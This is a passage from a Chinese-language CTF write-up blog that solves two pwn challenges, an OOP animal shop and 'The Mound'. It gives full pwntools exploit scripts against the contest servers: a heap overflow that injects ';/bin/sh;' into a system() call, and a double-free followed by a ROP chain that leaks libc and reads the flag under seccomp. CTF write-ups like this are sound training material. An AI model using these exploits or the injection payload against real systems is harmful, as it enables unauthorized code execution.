</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>virtual</span> <span style=color:#902000>void</span> Age();
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>virtual</span> <span style=color:#902000>void</span> <span style=color:#06287e>PrintInfo</span>();
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>virtual</span> <span style=color:#902000>int</span> <span style=color:#06287e>Sell</span>() <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#902000>void</span> <span style=color:#06287e>Translate</span>();
</span></span><span style=display:flex><span>    <span style=color:#902000>void</span> <span style=color:#06287e>SetName</span>();
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>virtual</span> <span style=color:#666>~</span>Animal() <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>default</span>;
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> type[<span style=color:#40a070>16</span>];
</span></span><span style=display:flex><span>    <span style=color:#902000>bool</span> dead <span style=color:#666>=</span> <span style=color:#007020>false</span>;
</span></span><span style=display:flex><span>    <span style=color:#902000>uint8_t</span> max_age;
</span></span><span style=display:flex><span>    <span style=color:#902000>uint8_t</span> hunger <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>protected</span><span style=color:#666>:</span>
</span></span><span style=display:flex><span>    <span style=color:#902000>uint8_t</span> age <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> name[<span style=color:#40a070>16</span>];
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><p>配合 translate 函数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#902000>void</span> Animal<span style=color:#666>::</span>Translate() {
</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> buf[<span style=color:#40a070>1024</span>];
</span></span><span style=display:flex><span>    sprintf(buf, <span style=color:#4070a0>&#34;/usr/games/cowsay -f ./%s.txt &#39;Feed me!&#39;&#34;</span>, <span style=color:#007020;font-weight:700>this</span><span style=color:#666>-&gt;</span>type);
</span></span><span style=display:flex><span>    system(buf);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>通过堆溢出修改 type 为 <code>;/bin/sh;</code>，执行该函数即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#sh = process(&#34;./oop&#34;)
</span></span><span style=display:flex><span>sh = remote(&#34;193.57.159.27&#34;, &#34;25295&#34;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def listAnimal():
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;1&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def sell(idx):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;2&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;animal? &#34;, str(idx))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;1&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def rename(idx, name):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;2&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;animal? &#34;, str(idx))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;animal? &#34;, name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def buy(which, name):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, str(which))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;animal? &#34;, name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def translator(idx):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;4&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;2&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;animal? &#34;, str(idx))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt; &#34;, &#39;4&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buy(2, &#39;0&#39;)
</span></span><span style=display:flex><span>buy(2, &#39;1&#39;)
</span></span><span style=display:flex><span>listAnimal()
</span></span><span style=display:flex><span>listAnimal()
</span></span><span style=display:flex><span>sell(0)
</span></span><span style=display:flex><span>sell(1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buy(2, &#39;0&#39;)
</span></span><span style=display:flex><span>buy(2, &#39;1&#39;)
</span></span><span style=display:flex><span>listAnimal()
</span></span><span style=display:flex><span>listAnimal()
</span></span><span style=display:flex><span>sell(0)
</span></span><span style=display:flex><span>sell(1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>buy(1, &#39;0&#39;)
</span></span><span style=display:flex><span>buy(1, &#39;1&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
</span></span><span style=display:flex><span>rename(0, &#39;a&#39; * 0x14 + p64(0) + p64(0x41) + p64(0x404d78) + &#39;flag&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>translator(1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div><p>拿 shell 之后不给我回显，不知道为什么，所以就改成读 flag 了。</p><h3 id=the-mound>The Mound</h3><p>ptmalloc 中的 prev_size 字段即为 key，通过 edit 方法可以多次修改，由此实现 double free。然后分配到 0xdead0008000 - 8 上,改 chunk_start 是可以的，所以可以任意地址分配</p><p>主要麻烦在于开启了 seccomp，只能做 orw</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>log_level <span style=color:#666>=</span> <span style=color:#4070a0>&#39;debug&#39;</span>
</span></span><span style=display:flex><span>context<span style=color:#666>.</span>terminal <span style=color:#666>=</span> [<span style=color:#4070a0>&#34;tmux&#34;</span>, <span style=color:#4070a0>&#34;splitw&#34;</span>, <span style=color:#4070a0>&#34;-h&#34;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./mound&#34;)</span>
</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;193.57.159.27&#34;</span>, <span style=color:#4070a0>&#34;41932&#34;</span>)
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./mound&#34;</span>)
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add_malloc</span>(idx, payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Pile: &#34;</span>, payload)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>add_mound</span>(idx, payload, size):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;2&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;pile: &#34;</span>, <span style=color:#007020>str</span>(size))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;Pile: &#34;</span>, payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>edit</span>(idx, payload):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;3&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;pile: &#34;</span>, <span style=color:#007020>str</span>(payload))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>delete</span>(idx):
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt; &#34;</span>, <span style=color:#4070a0>&#39;4&#39;</span>)
</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;index: &#34;</span>, <span style=color:#007020>str</span>(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF0</span>, <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF0</span>, <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>2</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF0</span>, <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>3</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF0</span>, <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>2</span>)
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add_malloc(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF7</span>)
</span></span><span style=display:flex><span>add_malloc(<span style=color:#40a070>1</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF7</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF0</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>0x00000beef0000010</span>)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>edit(<span style=color:#40a070>0</span>, <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0xF0</span> <span style=color:#666>+</span> p64(<span style=color:#40a070>1</span>)[:<span style=color:#666>-</span><span style=color:#40a070>1</span>])
</span></span><span style=display:flex><span>delete(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>2</span>, p64(<span style=color:#40a070>0x00000beef0000010</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0xdead0008008</span> <span style=color:#666>-</span> <span style=color:#40a070>0x10</span>), <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>3</span>, p64(<span style=color:#40a070>0x00000beef0000010</span>), <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>4</span>, p64(<span style=color:#40a070>0x00000beef0000010</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x404068</span>), <span style=color:#40a070>0xF0</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(elf<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;win&#34;</span>]) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;.</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>add_mound(<span style=color:#40a070>5</span>, payload, <span style=color:#40a070>0x200</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> <span style=color:#40a070>0x0000000000401e8b</span>
</span></span><span style=display:flex><span>ret <span style=color:#666>=</span> <span style=color:#40a070>0x0000000000401016</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#34;printf&#34;</span>])
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(elf<span style=color:#666>.</span>plt[<span style=color:#4070a0>&#34;printf&#34;</span>])
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(elf<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;win&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#gdb.attach(proc.pidof(sh)[0])</span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;;)</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, rop)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>, <span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>)) <span style=color:#666>-</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;printf&#34;</span>]
</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base: &#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rax_rdx_rbx_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000162865</span>
</span></span><span style=display:flex><span>pop_rsi_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000027529</span>
</span></span><span style=display:flex><span>syscall_ret <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> <span style=color:#40a070>0x0000000000066229</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x404080</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;open&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>3</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x00000beef0000000</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>217</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x600</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(syscall_ret)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x00000beef0000000</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x600</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;write&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x00000beef0001000</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x20</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;read&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x40</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x00000beef0001000</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;open&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>4</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x00000beef0000000</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x60</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;read&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rdi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rsi_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0x00000beef0000000</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(pop_rax_rdx_rbx_ret)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x60</span>) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>rop <span style=color:#666>+=</span> p64(libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>sym[<span style=color:#4070a0>&#34;write&#34;</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendafter(<span style=color:#4070a0>&#34;;)</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, rop)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><p>远程把 flag 名字随机掉了，所以用 getdents 先把文件名读出来，然后再 orw。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div><script src=https://giscus.app/client.js data-repo=chujDK/chujdk.github.io data-repo-id=R_kgDOI__mNg data-category=Announcements data-category-id=DIC_kwDOI__mNs4CYoyP data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/chujdk rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a><a class=soc href=mailto:chujj31@gmail.com rel=me title=Mail><i data-feather=mail></i></a>
<a class=border></a><a class=soc href=https://www.cjovi.icu/index.xml rel=me title=Rss><i data-feather=rss></i></a>
<a class=border></a></div><div class=footer-info>&nbsp2020 ~ 2024  © chuj |  Based on <a href=https://github.com/athul/archie>Archie</a> | Built with <a href=https://gohugo.io>Hugo</a> | <a href=#>Goto Top</a></div></footer><script>feather.replace()</script></div></body></html>